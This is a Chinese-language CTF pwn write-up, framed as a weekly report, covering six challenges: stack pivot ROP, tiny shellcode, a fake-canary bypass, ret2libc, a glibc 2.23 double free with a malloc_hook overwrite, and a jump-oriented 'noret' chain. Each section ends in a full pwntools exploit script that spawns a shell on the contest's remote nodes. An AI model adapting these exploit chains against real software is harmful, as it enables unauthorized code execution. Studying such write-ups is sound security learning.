其实这应该算在wp里面?但既然我把它当周报发出来了,就当它是周报吧

### 1.**overflow**

32位栈溢出.当然,直接写rop链是不行的.

观察main函数结尾:

```assembly
.text:080498B8                 add     esp, 10h
.text:080498BB                 mov     eax, 0
.text:080498C0                 lea     esp, [ebp-8]
.text:080498C3                 pop     ecx
.text:080498C4                 pop     ebx
.text:080498C5                 pop     ebp
.text:080498C6                 lea     esp, [ecx-4]
.text:080498C9                 retn
```

可以看到程序在ret前,调整了esp的位置.因此按照正常的返回地址去写rop链是不可行的.解决方案很简单,将rop链写到bss段,再控制esp到同一位置即可.

那么编写脚本如下:

```python
from pwn import *

edi_add=0x8049a80
esi_add=0x804fc5f

eax_add=0x80b470a

ebx_add=0x08049022
ecx_add=0x08049802
edx_add=0x08060bd1
int80=0x08049c6a
syscall=0x08064acd
r=process("./pwn")
#r=remote("node1.tgctf.woooo.tech",30754)
gdb.attach(r)
pause()
r.recvuntil(b"could you tell me your name?")
r.send(b"/bin/sh\x00"+p32(0)+p32(0x080EF334)+p32(ebx_add)+p32(0x080EF320)+p32(ecx_add)+p32(0)+p32(edx_add)+p32(0)+p32(eax_add)+p32(0xb)+p32(int80))
r.recvuntil("i heard you love gets,right?")

pay=b'a'*200+p32(0x080EF334)
r.sendline(pay)
r.interactive()

```

### 2.shellcode

又是特殊shellcode.根据题目的提示,我们看到执行shellcode前程序执行的操作:

```assembly
.text:00000000000011CD                 push    rbp
.text:00000000000011CE                 mov     rbp, rsp
.text:00000000000011D1                 push    r15
.text:00000000000011D3                 push    r14
.text:00000000000011D5                 push    r13
.text:00000000000011D7                 push    r12
.text:00000000000011D9                 push    rbx
.text:00000000000011DA                 mov     [rbp+var_30], rdi
.text:00000000000011DE                 mov     rdi, [rbp+var_30]
.text:00000000000011E2                 xor     rax, rax
.text:00000000000011E5                 xor     rbx, rbx
.text:00000000000011E8                 xor     rcx, rcx
.text:00000000000011EB                 xor     rdx, rdx
.text:00000000000011EE                 xor     rsi, rsi
.text:00000000000011F1                 xor     r8, r8
.text:00000000000011F4                 xor     r9, r9
.text:00000000000011F7                 xor     r10, r10
.text:00000000000011FA                 xor     r11, r11
.text:00000000000011FD                 xor     r12, r12
.text:0000000000001200                 xor     r13, r13
.text:0000000000001203                 xor     r14, r14
.text:0000000000001206                 xor     r15, r15
.text:0000000000001209                 xor     rbp, rbp
.text:000000000000120C                 xor     rsp, rsp
.text:000000000000120F                 mov     rdi, rdi
.text:0000000000001212                 jmp     rdi
```

可以看到rsi,rdx都已经设置好了,我们只需要将rdi设置为/bin/sh地址,并将rax设置为59即可.由于题目只给了0x12字节,/bin/sh还用掉了7字节,所以我们实际上只有0xb字节可以用,且/bin/sh地址未知.

但由于程序使用`jmp rdi`进行跳转,而/bin/sh字符串在shellcode中的相对位置是我们能控制的.因此我们可以使用add rdi 的方式将rdi调整为合适的值.

那么编写脚本如下:

```python
from pwn import *
context.log_level='debug'
context.arch='amd64'
#r=process("./pwn")
#gdb.attach(r)
r=remote("node2.tgctf.woooo.tech",31991)
pause()
shellcode=asm('''
add rdi,11 ;
mov eax,59;
syscall ;
''')
pay=shellcode+b'/bin/sh'

r.send(pay)
r.interactive()

```

### 3.stack

题目模拟了canary,通过在我们能溢出到的地方之外记录返回地址的方式,来防止缓冲区溢出漏洞.

```assembly
mov     rax, [rbp+arg_18];记录的地址
cmp     rax, [rbp+8];返回地址
jnz     short sub_4011B6;不相等则跳转
```

```assembly
; Attributes: bp-based frame

; void *sub_4011B6()
sub_4011B6 proc near

var_8= qword ptr -8

; __unwind {
endbr64
push    rbp
mov     rbp, rsp
lea     rax, buf
mov     [rbp+var_8], rax
lea     rcx, buf
mov     rax, cs:qword_4040A0
mov     rdi, cs:fd      ; fd
mov     rsi, rcx        ; buf
mov     rdx, cs:count   ; count
syscall                 ; LINUX - sys_write
mov     rax, 3Ch ; '<'
mov     rdi, 1          ; error_code
syscall                 ; LINUX - sys_exit
; } // starts at 4011B6
```

但我们不难(好吧,其实并不是那么不难)注意到,系统调用write时,各个参数甚至系统调用号都是由bss上的全局变量控制的.而main函数里的read(0xA8)也足以覆盖到它们.

于是我们可以将这些参数覆盖为execve("/bin/sh",0,0),然后故意触发溢出跳转到这个函数,实现getshell.

脚本如下:

```python
from pwn import *

r=process("./pwn")
r=remote("node1.tgctf.woooo.tech",31927)
#gdb.attach(r)
pause()
r.recvuntil(b"name?\n")
pay1=b"a"*0x40+p64(59)+p64(0x404108)+p64(0)+p64(0)
r.send(pay1)

r.recvuntil(b"to say?\n")
pay2=b'a'*0x48+p64(0x404060)
r.send(pay2)

r.interactive()

#0x40111D
#0x40115F
```

### 4.签到

很普通的ret2libc,没什么特别的

```python
from pwn import *
context.log_level='debug'
main_add=0x401178
rdi_add=0x401176

puts_plt=0x401060
puts_got=0x404018
ret_add=0x40101a
libc=ELF("./libc.so.6")


pay1=b'a'*120+p64(rdi_add)+p64(puts_got)+p64(puts_plt)+p64(main_add)

#r=process("./pwn")
r=remote("node1.tgctf.woooo.tech",31315)
pause()
r.recvuntil(b"name.")

r.sendline(pay1)
#r.interactive()

libc_base=u64(r.recvuntil(b"As")[-9:-3].ljust(8,b"\x00"))-libc.sym["puts"]
pause()
print(hex(libc_base))

pay2=b'a'*120+p64(ret_add)+p64(rdi_add)+p64(next(libc.search(b"/bin/sh"))+libc_base)+p64(libc.sym["system"]+libc_base)

r.recvuntil(b"name.")

r.sendline(pay2)
r.interactive()
```

### 5.heap

2.23菜单题,但edit功能edit的是bss上的全局变量.

```c
int menu()
{
  puts("1. new something");
  puts("2. delete something");
  puts("3. change your name");
  return puts("4. exit");
}
```

```c
int __fastcall sub_400A81(const char *a1)
{
  puts("change your name?");
  printf("> ");
  read(0, byte_6020C0, 0xD0uLL);
  return printf("Ah, right! nice to see you %s!\n", byte_6020C0);
}
```

漏洞在del,free后没有清空指针.

那么我们通过double_free,申请到一个bss段可编辑区域内的chunk.再修改它的size为unsorted_bin并伪造next_chunk,获取libc.之后打malloc_hook即可.

编写脚本如下:

```python
from pwn import *
#
def add_(size,text):
	r.recvuntil(b"> ")
	r.sendline(b"1")
	r.recvuntil(b"> ")
	r.sendline(str(size))
	r.recvuntil(b"> ")
	r.send(text)
	r.recvuntil(b"good!")
def del_(index):
	r.recvuntil(b"> ")
	r.sendline(b"2")
	r.recvuntil(b"> ")
	r.sendline(str(index))
	r.recvuntil(b"finish")

def edit_(text):
	
	r.recvuntil(b"> ")
	r.sendline(b"3")	
	r.send(text)

#r=process("./pwn")
r=remote("node1.tgctf.woooo.tech",30333)
pause()
r.recvuntil(b"> ")
r.send(p64(0)+p64(0x31))
add_(0x20,b'a')
add_(0x20,b'b')
del_(0)
del_(1)
del_(0)
add_(0x20,p64(0x6020C0))
add_(0x20,b'b')
add_(0x20,b'c')
add_(0x20,b'd')
edit_(p64(0)+p64(0x91)+b'a'*0x80+p64(0)+p64(0x21)+b"a"*0x10+p64(0)+p64(0x21))



del_(5)
edit_(b"a"*0x10)

r.recvuntil(b"Ah, right! nice to see you ")
r.recvuntil(b"a"*0x10)
libc=ELF("./libc.so.6")
libc_base=u64(r.recvuntil(b"\x7f").ljust(8,b"\x00"))-0x3C4B78
print(hex(libc_base))
mh_add=libc_base+libc.sym["__malloc_hook"]-0x10-0x13

edit_(p64(0)+p64(0x70)+p64(mh_add)+p64(libc_base+0x3C4B78)+b'a'*0x50+p64(0)+p64(0x21)+b'a'*0x10+p64(0)+p64(0x21))

context.log_level='debug'
del_(5)
edit_(p64(0)+p64(0x70)+p64(mh_add))
pause()
add_(0x68,b'a')
#0xf03a4
#0xf1247
one_add=0xf1247+libc_base
add_(0x68,b'a'*0x13+p64(one_add))



r.interactive()
```

### 6.**noret**

程序用了一种相当怪的方法取代了ret.

```assembly
.text:000000000040113F                 add     rsp, 8
.text:0000000000401143                 jmp     qword ptr [rsp-8]
```

另外程序还在开头提供了一大堆gadget:

```assembly
.text:0000000000401000 loc_401000:                             ; DATA XREF: LOAD:0000000000400088↑o
.text:0000000000401000                 xchg    rax, rdi
.text:0000000000401002                 jmp     qword ptr [rax+1]
.text:0000000000401005 ; ---------------------------------------------------------------------------
.text:0000000000401005                 mov     rcx, rdi
.text:0000000000401008                 jmp     qword ptr [rcx]
.text:000000000040100A ; ---------------------------------------------------------------------------
.text:000000000040100A                 xor     rax, rax
.text:000000000040100D                 jmp     qword ptr [rdx]
.text:000000000040100F ; ---------------------------------------------------------------------------
.text:000000000040100F                 pop     rsp
.text:0000000000401010                 pop     rdi
.text:0000000000401011                 pop     rcx
.text:0000000000401012                 pop     rdx
.text:0000000000401013                 jmp     qword ptr [rdi+1]
.text:0000000000401016 ; ---------------------------------------------------------------------------
.text:0000000000401016                 pop     rcx
.text:0000000000401017                 or      bh, bh
.text:0000000000401019                 jmp     qword ptr [rdx]
.text:000000000040101B ; ---------------------------------------------------------------------------
.text:000000000040101B                 mov     rsi, [rcx+10h]
.text:000000000040101F                 jmp     qword ptr [rdx]
.text:0000000000401021 ; ---------------------------------------------------------------------------
.text:0000000000401021                 pop     rdx
.text:0000000000401022                 jmp     qword ptr [rcx]
.text:0000000000401024 ; ---------------------------------------------------------------------------
.text:0000000000401024                 add     rax, rdx
.text:0000000000401027                 jmp     qword ptr [rcx]
.text:0000000000401029 ; ---------------------------------------------------------------------------
.text:0000000000401029                 pop     rcx
.text:000000000040102A                 jmp     qword ptr [rdx]
.text:000000000040102C
```

那么我们只需要将rcx,rdx等寄存器指向一个存有程序自己实现的ret的地址,就能让这些gadgets等效为一般的pop;ret;gadgets.

编写脚本如下:

```python
from pwn import *

context(arch='amd64', os='linux')

#r=process("./pwn")
#gdb.attach(r)
r=remote("node1.tgctf.woooo.tech",32203)
pause()

pay1=b'2'+b"\x00"*3+p64(0x4021a7)+b"\xD2\x10\x40"
r.recvuntil(b"> ")
r.send(pay1)

r.recvuntil(b"Submit your feedback: ")

r.send(b"a"*0x100+p64(0x40100F)+p64(0x4021a0))
r.recvuntil(b"Thank you for your feedback!")
ret=0x40113F

pay2=p64(0x4022c7)+p64(0x4022c8)+p64(0x4022c8)+p64(0x40101B)+p64(0x40100a)+p64(0x401021)+p64(0x4022d0)+p64(0x401024)+p64(0x401000)+p64(0x401021)+p64(0x4022c8)+p64(0x40100a)+p64(0x401021)+p64(59)+p64(0x401024)+p64(0x401021)+p64(0)+p64(0x401153)
pay2=pay2.ljust(0x100,b"\x00")+p64(0x40100F)+p64(0x4021b8)+p64(ret)+b"/bin/sh\x00"
#0x4022b8
pause()
r.send(pay2)
r.interactive()
```

